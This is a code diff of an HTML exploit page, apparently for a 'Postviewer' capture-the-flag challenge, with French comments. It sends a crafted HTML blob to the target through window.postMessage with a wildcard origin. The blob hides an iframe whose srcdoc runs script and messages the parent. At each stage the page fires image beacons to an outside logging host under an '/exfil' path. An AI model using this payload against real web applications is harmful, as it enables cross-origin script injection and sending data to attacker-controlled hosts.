@@ -2,25 +2,38 @@
 <html>
 <body>
 <script>
-/* ping : la page externe est chargée */
+/* ping : page externe chargée */
 new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=outer_loaded';
 
 (async () => {
-  /* --- blob HTML minimal : uniquement une balise <img> --- */
+  /* HTML du blob — AUCUN script direct, seulement un iframe srcdoc */
   const epic = `
     <html><body>
-      <img src="https://webtest.free.beeceptor.com/exfil?f=blob_start">
+      <iframe style="display:none"
+              srcdoc="
+                <script>
+                  parent.postMessage('blob_start','*');
+                <\/script>
+              ">
+      </iframe>
     </body></html>`;
 
   const blob = new Blob([epic], {type:'text/html'});
 
-  /* --- envoi à Postviewer --- */
+  window.addEventListener('message', e => {
+    if (e.data === 'blob_start') {
+      new Image().src =
+        'https://webtest.free.beeceptor.com/exfil?f=blob_start';
+    }
+  });
+
   window.postMessage({
     type:'share',
     files:[{blob, name:'probe.html', cached:false}]
   }, '*');
 
-  new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=postmessage_sent';
+  new Image().src =
+    'https://webtest.free.beeceptor.com/exfil?f=postmessage_sent';
 })();
 </script>
 </body>
